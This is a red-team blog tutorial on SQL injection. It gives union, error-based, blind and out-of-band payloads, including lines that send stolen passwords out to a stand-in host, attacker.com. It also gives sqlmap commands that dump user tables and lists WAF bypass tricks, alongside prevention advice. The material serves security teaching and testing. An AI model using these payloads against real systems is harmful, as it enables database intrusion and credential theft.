---
title: "SQL Injection Deep Dive: From Detection to Exploitation"
date: 2025-04-17
description: "A comprehensive technical guide to SQL injection attack techniques, detection methods, and prevention strategies for web applications."
tags: ["web-security", "red-team", "pentesting", "sql", "owasp"]
categories: ["Red Team"]
image: "https://picsum.photos/seed/sqli12/800/400"
authors:
  - name: "0xrh0d4m1n"
    link: "https://github.com/0xrh0d4m1n"
    image: "https://github.com/0xrh0d4m1n.png"
---

## SQL Injection Overview

SQL injection (SQLi) remains one of the **most critical web application vulnerabilities**, consistently appearing in the OWASP Top 10. It occurs when user input is concatenated directly into SQL queries without proper sanitization.

## Types of SQL Injection

### In-Band (Classic)

The attacker uses the same communication channel to inject and retrieve data.

```sql
-- Union-based extraction
' UNION SELECT username, password FROM users--

-- Error-based extraction (MySQL)
' AND (SELECT 1 FROM (SELECT COUNT(*),
  CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x
  FROM information_schema.tables GROUP BY x) a)--
```

### Blind SQL Injection

No direct output -- the attacker infers data from application behavior.

```sql
-- Boolean-based blind
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--

-- Time-based blind
' AND IF(1=1, SLEEP(5), 0)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### Out-of-Band

Data is exfiltrated through a different channel (DNS, HTTP requests).

```sql
-- DNS exfiltration (MSSQL)
'; EXEC master..xp_dirtree '\\attacker.com\share'--

-- HTTP exfiltration (Oracle)
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||
  (SELECT password FROM users WHERE rownum=1)) FROM dual--
```

## Detection with SQLMap

```bash
# Basic detection
sqlmap -u "http://target.com/page?id=1" --batch

# With authentication cookie
sqlmap -u "http://target.com/api/item?id=1" \
  --cookie="session=abc123" \
  --level=3 --risk=2

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump specific table
sqlmap -u "http://target.com/page?id=1" \
  -D webapp -T users --dump
```

## Prevention Strategies

| Method | Effectiveness | Implementation |
|--------|--------------|----------------|
| Parameterized Queries | **Excellent** | Use prepared statements |
| ORM Frameworks | Good | Django ORM, SQLAlchemy |
| Input Validation | Moderate | Whitelist allowed characters |
| WAF Rules | Supplementary | ModSecurity, Cloudflare |
| Least Privilege | Defense in depth | Restrict DB user permissions |

### Parameterized Query Examples

```python
# VULNERABLE -- never do this
query = f"SELECT * FROM users WHERE id = {user_input}"

# SAFE -- parameterized query
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))

# SAFE -- using SQLAlchemy ORM
user = session.query(User).filter(User.id == user_input).first()
```

### WAF Bypass Techniques (For Testing)

Testers should be aware of common bypass methods:

- **Case variation**: `SeLeCt` instead of `SELECT`
- **Comment injection**: `SEL/**/ECT`
- **URL encoding**: `%53%45%4C%45%43%54`
- **Unicode normalization**: using fullwidth characters

> SQL injection is *entirely preventable* through proper coding practices. There is no excuse for SQLi in modern applications.

Always test for SQLi during security assessments and enforce parameterized queries in your development standards.
